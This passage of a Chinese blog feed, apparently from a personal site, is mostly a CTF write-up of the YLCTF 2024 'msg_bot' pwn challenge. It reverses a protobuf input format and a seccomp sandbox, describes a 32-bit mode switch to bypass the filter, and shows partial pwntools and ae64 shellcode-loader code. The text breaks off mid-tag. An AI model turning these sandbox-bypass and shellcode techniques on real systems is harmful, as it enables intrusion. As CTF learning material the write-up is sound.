class="headerlink" title="逻辑引擎"></a>逻辑引擎</h2><p>这个好像没什么好讲的。指令操作码解码的时候，因为只有4个指令，所以只用到四路输出，剩下的不管。另外要注意的是，要用开关控制住其他的运算结果不要和要输出的冲突输出了。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E9%80%BB%E8%BE%91%E5%BC%95%E6%93%8E.png" alt="逻辑引擎"></p>]]></content>
      
      
      <categories>
          
          <category> 图灵完备 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图灵完备 </tag>
            
            <tag> 计组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『YLCTF 源鲁杯 2024』 msg_bot</title>
      <link href="/2024/YLCTF-msgbot-protobuf/"/>
      <url>/2024/YLCTF-msgbot-protobuf/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_1389</span><span class="params">(<span class="type">double</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  isnan(a1);</span><br><span class="line">  v2 = rand();</span><br><span class="line">  result = mmap((<span class="type">void</span> *)(v2 % <span class="number">0x7FFFFFFF</span>), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  dest = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请了一块mmap地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_164B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;botmsg: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  qword_4058 = sub_199E(<span class="number">0LL</span>, v1, buf);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4058 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;format error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">24</span>) == <span class="number">3735928559LL</span> &amp;&amp; *(_QWORD *)(qword_4058 + <span class="number">32</span>) == <span class="number">195939070LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;format checked.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">24</span>) == <span class="number">3235839725LL</span> &amp;&amp; *(_QWORD *)(qword_4058 + <span class="number">32</span>) == <span class="number">4027448014LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_15B2(*(_QWORD *)(qword_4058 + <span class="number">48</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*(_QWORD *)(qword_4058 + <span class="number">40</span>));</span><br><span class="line">    sub_1461();</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">40</span>) &lt;= <span class="number">0xC7</span>uLL &amp;&amp; v1 &lt;= <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, *(<span class="type">const</span> <span class="type">void</span> **)(qword_4058 + <span class="number">48</span>), *(_QWORD *)(qword_4058 + <span class="number">40</span>));</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nothing.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_199E就是解包函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_15B2</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 - <span class="number">1</span> + a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">    v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="number">31</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以给传入shellcode，但是要求在可见字符范围内。并且开了沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1461</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  v43 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">53</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  v10 = <span class="number">0x40000000</span>;</span><br><span class="line">  v11 = <span class="number">21</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">6</span>;</span><br><span class="line">  v14 = <span class="number">-1</span>;</span><br><span class="line">  v15 = <span class="number">21</span>;</span><br><span class="line">  v16 = <span class="number">5</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">21</span>;</span><br><span class="line">  v20 = <span class="number">4</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">1</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">3</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">5</span>;</span><br><span class="line">  v27 = <span class="number">21</span>;</span><br><span class="line">  v28 = <span class="number">2</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">37</span>;</span><br><span class="line">  v31 = <span class="number">21</span>;</span><br><span class="line">  v32 = <span class="number">1</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">231</span>;</span><br><span class="line">  v35 = <span class="number">6</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">10</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v43 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行shellcode。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h3><p>首先是程序要求以protobuf格式进行输入。protobuf环境安装看我的<a href="https://c-lby.top/2024/10/11/protobuf-install/">这篇文章</a>。接下来先逆向proto数据格式。不清楚怎么逆向的，可以先看Real返璞归真师傅的<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">文章</a>.</p><p>我们打开IDA-view视图，按ctrl+s，找到.data.rel.ro段。<img src="https://c-lby.top/images/2024YLCTF-1/proto%E5%AD%97%E6%AE%B5.png" alt="proto字段"></p><p>在0x3C68偏移处可以看到proto名字叫msgbot，package名字是bot，一共3个字段。根据0x3C98处的指针跟进到字段表。</p><p><img src="https://c-lby.top/images/2024YLCTF-1/bot%E5%AD%97%E6%AE%B5%E8%A1%A8.png" alt="bot字段表"></p><p>第一个字段是msgid，1是字段的id，3说明字段的label是none(同时说明syntax是3)，第二个3说明字段的类型是int64，0x18说明这个字段在proto里面的偏移是0x18。以此类推。0xF的类型是bytes。于是就可得到bot.proto:</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax=<span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> bot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">msgbot</span> &#123;</span><br><span class="line">    <span class="type">int64</span> msgid=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int64</span> msgsize=<span class="number">2</span>;</span><br><span class="line">    <span class="type">bytes</span> msgcontent=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>protoc --python_out=. bot.proto</code>生成python文件用来写脚本。</p><p>根据主逻辑里给出来的条件判断，写出前置脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2 <span class="keyword">as</span> pb <span class="comment">#protobuf生成的文件</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64 <span class="comment">#用来生成可见字符shellcode的工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41741</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;botmsg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = pb.msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = <span class="string">b&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg.SerializeToString()))</span><br></pre></td></tr></table></figure><h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><p>当传输的数据满足一定条件时，就能进到执行shellcode的路径，但是同时这条路上程序也开了个沙盒。这道题比较恶心的点是，沙盒是在分支里才开启的，需要输入特定的数据，用seccomp-tools没法直接dump出来，因为在终端没法直接输入不可见字节。也许用脚本或者其他方式能够dump出来，但是我不会，所以用了个比较蠢但是一定对的方法来看沙盒规则：根据伪代码自己写一个程序。其实如果对prctl熟悉的话，也许可以直接从伪代码看出来规则，但是我不熟悉，在网上查了很久才看懂prctl的用法，这里不展开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_filter</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">        &#123;<span class="number">0x35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x25</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xe7</span>&#125;,</span><br><span class="line">        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">// BPF_JUMP(21, 59, 2, 1),</span></span><br><span class="line">        <span class="comment">// BPF_JUMP(21, 11, 1, 0),</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    install_filter();</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后再用seccomp-tools导出沙盒规则，就好看了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./tmp</span></span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000025  if (A == alarm) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>open被禁了，但是32位下的open调用号是5号，刚好是64位fstat的调用号，并且这个沙箱并没有限制架构，所以可以转成32位后调用open，再转回64位执行read和write。</p><h3 id="shellcode（详细调试及手搓教程）"><a href="#shellcode（详细调试及手搓教程）" class="headerlink" title="shellcode（详细调试及手搓教程）"></a>shellcode（详细调试及手搓教程）</h3><h4 id="关掉alarm防止影响调试"><a href="#关掉alarm防止影响调试" class="headerlink" title="关掉alarm防止影响调试"></a>关掉alarm防止影响调试</h4><p><code>sed -i s/alarm/isnan/g ./msg_bot</code></p><p>将程序中的alarm替换为isnan，isnan函数不会影响程序的流程，这样就不会被alarm影响调试了。</p><h4 id="ae64和出现的问题"><a href="#ae64和出现的问题" class="headerlink" title="ae64和出现的问题"></a>ae64和出现的问题</h4><p>这道题还有个限制就是传进去的shellcode需要时可见字符，这里就需要用到一些工具来进行转换。可以用alpha3或者ae64，网上都有详细的介绍，我这里用的是ae64。</p><p>一般来说，要使用转架构的方式绕过沙盒，都需要一段可控地址的可执行内存，一般是使用mmap来获取，但是这个沙盒并没有给mmap。仔细观察发现执行shellcode的时候使以<code>call rax</code>的方式进行跳转的，而我们的shellcode就写在一段可执行的mmap内存里。地址是随机生成的，但是都控制在了四个字节以内。这意味这，虽然地址我们不能直接获取，但是保证了一定是一个32位也可用的地址，所以在手搓shellcode的时候可以注意从rax中获取地址。</p><p>ae64可以将一段64位汇编的shellcode转成只有可见字符组成的shellcode。其本质功能是生成一段shellcode，它可以通过各种计算将我原本的shellcode还原出来到内存中，并跳转执行。但是在使用调试过程中发现两个问题。假如我的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">xor eax, eax</span><br><span class="line">push 0x7a</span><br><span class="line">pop rdx</span><br><span class="line">xor edi, edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这很明显是一个read的系统调用。第一个问题可能是一个bug：ae64的shellcode执行完后，我的代码还原完毕，但是我发现我的syscall被还原成了不知道什么东西（punpckhdq那坨），导致这个read执行不成功。<img src="https://c-lby.top/images/2024YLCTF-1/%E9%94%99%E8%AF%AF%E8%BF%98%E5%8E%9F%E7%9A%84%E4%BB%A3%E7%A0%81.png" alt="错误还原的代码"></p><p>解决方法是，在syscall之前写几个nop。猜测可能和一定倍数对齐有关，没有深入探究。</p><p>第二个问题是，原本存在rax中的内存地址，会被还原代码的shellcode给破坏掉。也就是说，等到执行我的代码的时候，push rax也获取不到mmap的地址了。<img src="https://c-lby.top/images/2024YLCTF-1/rax%E8%A2%AB%E7%A0%B4%E5%9D%8F.png" alt="rax被破坏"></p><p>不过仔细观察可以发现这时候rsp刚好指向mmap出来的地址加上一定偏移。经过几次验证可以发现mmap的地址一定会以\x00结尾，并且rsp指向的这个地址和这块内存的基址偏移是固定的，所以我们就不需要push再pop了，直接pop rsi就可以了。</p><h4 id="写一个shellcode-loader"><a href="#写一个shellcode-loader" class="headerlink" title="写一个shellcode loader"></a>写一个shellcode loader</h4><p>结合前面两个问题，我们可以写出这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sc1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">push 0x96</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">msg.msgcontent = AE64().encode(shellcode, strategy=<span class="string">&#x27;small&#x27;</span>) <span class="comment">#用AE64生成一段最短可见字符的生成sc1的shellcode</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>诶对了，为什么我们要写这个read的syscall呢？因为程序还限制了传入的shellcode长度不能超过199。其实准确来说是184，因为还要算上protobuf前面的数据内容。想要把整个完整shellcode都用ae64打包成可见字符shellcode是不可能的，光是上面这段代码打包后的数据包总长度就达到了157字节，所以最好的方法就是先写一个shellcode loader，然后再传入真正orw的shellcode，这样既没有长度也没有可见字符的限制。</p><h4 id="写一段32位的open系统调用"><a href="#写一段32位的open系统调用" class="headerlink" title="写一段32位的open系统调用"></a>写一段32位的open系统调用</h4><p>接下来我们要动调查看rsi是多少，我们接下来读入的第二段shellcode是从哪里开始读入的，rip下一步会从哪里开始执行，来确定接下来的shellcode该怎么写。pwndbg断点在mmap的地址可能会飞过去，所以我们断点在<code>call rax</code>(0x17C9)前，再单步执行到syscall处。<img 